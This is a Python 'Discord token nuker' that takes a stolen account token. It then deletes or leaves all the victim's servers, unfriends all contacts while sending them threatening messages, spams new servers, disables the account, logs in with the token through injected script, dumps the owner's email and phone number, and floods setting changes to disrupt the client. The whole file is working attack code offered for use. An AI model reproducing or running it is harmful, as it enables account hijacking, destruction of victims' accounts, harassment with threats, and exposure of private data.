import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
import os
import colorama
from discord.ext import commands
from discord.ext.commands import Bot

import pyfiglet
from pyfiglet import Figlet

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
clear = lambda: os.system('clear')
clear()

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

token = input(
    """\033[95m
	
	                                                                                   


                                                           
	
\033[91m
                         ✞𝐀𝐲'𝐤 𝐁𝐮𝐥𝐥𝐞𝐭𝐬✞ gon fuck someone up
                               涙 を 流 す"""
    "\033[91m\n\n                  +-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+\n                   E n t e r   T o k e n   B e l o w\n                  +-+-+-+-+-+ +-+-+-+-+-+ +-+-+-+-+-+\n                  Token:\033[00m"
)
head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print('Token Valid ')
    input("Press Any Key To Continue...")
else:
    print('Invalid Token')
    input("Press Any Key To Exit...")
    exit(0)

print('\n')
print('1 - NUKE')
print('2 - REMOVE ALL FRIENDS')
print('3 - DELETE AND LEAVE ALL SERVERS')
print('4 - SPAM SERVERS')
print('5 - DISABLE ACCOUNT')
print('6 - LOGIN WITH TOKEN')
print('7 - GRAB ACCOUNT INFO')
print('8 - GIVE TOKEN OWNER A STROKE')
print('\n')


def nuke():
    print("Loading...")
    print('\n')

    @bot.event
    async def on_ready(times: int = 100):

        print('STATUS : [NUKE]')
        print('\n')
        print('1 - LEAVING SERVERS')
        print('\n')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')
            except:
                print(f'CANT LEAVE [{guild.name}]')
        print('\n')
        print('2 - DELETING OWNED SERVERS')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] has been deleted')
            except:
                print(f'CANT DELETE [{guild.name}]')

        print('\n')
        print('3 - REMOVING ALL FRIENDS')
        print('\n')

        for user in bot.user.friends:
            try:
                await user.dm_channel.send('AK#2353 has crucified this user and put him on a bloody cross and now he is bleeding on the grass beneath him. Save him by adding AK#2353. If you piss AK off, He will come hunt you down. Cya! || This is me: https://images-ext-2.discordapp.net/external/1MVLOt7nVjKSIOpT3hUVmhyxobAeyKooxFJztF4YyNM/%3Fsize%3D256/https/cdn.discordapp.com/avatars/468918343508688896/a_97582fc0a55895560253b41a6c2ae401.gif || ')
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print('4 - SPAMMING SERVERS')
        print('\n')

        for i in range(times):
            await bot.create_guild('Nuked By AK#2353', region=None, icon=None)
            print(f'{i} useless server created')
        print('\n')
        print('Max server limit is [100]')
        print('\n')
        print('\n')
        print('5 - CRASHING DISCORD')
        print('\n')

        print('\n')
        print("CRASHING THE TOKEN OWNER'S DISCORD...")
        print(
            'IF YOU WANNA KEEP GIVING TOKEN OWNER A STROKE THEN KEEP THIS EXE RUNNING'
        )
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
            }
            requests.patch(
                "https://discord.com/api/v6/users/@me/settings",
                headers=headers,
                json=setting)

    bot.run(token, bot=False)


def unfriender():
    print("Loading...")

    @bot.event
    async def on_ready():
        print('STATUS : [UNFRIENDER]')

        for user in bot.user.friends:
            try:
                embed=discord.Embed(title="You're not safe btw. We are coming for you next. Better Run!", description="Chapter 666: This user is now on a bloody cross bleeding out slowly.", color=0xff0000) 
                embed.set_author(name="Ay'k has crucified this user.") 
                embed.set_footer(text="Sent by AK#2353 | Add Me")
                embed.set_image(url="https://images-ext-2.discordapp.net/external/1MVLOt7nVjKSIOpT3hUVmhyxobAeyKooxFJztF4YyNM/%3Fsize%3D256/https/cdn.discordapp.com/avatars/468918343508688896/a_97582fc0a55895560253b41a6c2ae401.gif") 
                await user.dm_channel.send(embed=embed)
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"CAN'T UNFRIEND {user}")

        print('\n')
        print(
            '[[UNFRIENDING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)


#### server leaver
def leaver():
    print("Loading...")
    #bot.logout

    @bot.event
    async def on_ready():
        print('STATUS : [SERVER LEAVER]')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left [{guild.name}]')
            except:
                print(f'cant leave [{guild.name}] but it will be deleted...')

        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] has been deleted')
            except:
                print(f"CAN'T DELETE [{guild.name}]")

        print('\n')
        print('[[LEAVING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)


#### spam servers
def spamservers():
    print("Loading...")

    @bot.event
    async def on_ready(times: int = 95):
        print('STATUS : [SERVER SPAMMER]')

        for i in range(times):
            await bot.create_guild(
                'Nuked By AK#2353', region=None, icon=None)
            print(f'{i} useless server created')

        print('max server limit is [100]')
        print('\n')
        print('[[SPAMMING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')
        input()

    bot.run(token, bot=False)


def tokenDisable(token):
    print('STATUS : [DISABLING TOKEN]')
    r = requests.patch(
        'https://discordapp.com/api/v6/users/@me',
        headers={'Authorization': token})
    if r.status_code == 400:
        print(f'Account disabled successfully')
        input("Press any key to exit...")
    else:
        print(f'Invalid token')
        input("Press any key to exit...")


def tokenLogin(token):
    print('STATUS : [LOGIN WITH TOKEN]')
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')


def tokenInfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
        input()


def crashdiscord(token):
    print('STATUS : [DISCORD CRASHER]')
    print('\n')
    print('CRASHING THE TOKEN OWNER DISCORD...')
    print('IF YOU WANNA KEEP CRASHING HIS DISCORD KEEP THE TOOL WORKING')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
        }
        requests.patch(
            "https://discord.com/api/v6/users/@me/settings",
            headers=headers,
            json=setting)


def mainanswer():
  
    answer = input('\033[1;00m[\033[91mDrago\033[1;00m]-\033[91m涙\033[00m Choose : ')
    if answer == '1':
        nuke()
    elif answer == '2':
        unfriender()
    elif answer == '3':
        leaver()
    elif answer == '4':
        spamservers()
    elif answer == '5':
        tokenDisable(token)
    elif answer == '6':
        tokenLogin(token)
    elif answer == '7':
        tokenInfo(token)
    elif answer == '8':
        crashdiscord(token)
    else:
        print('Incorrect selection, please choose a number')
        mainanswer()


mainanswer()
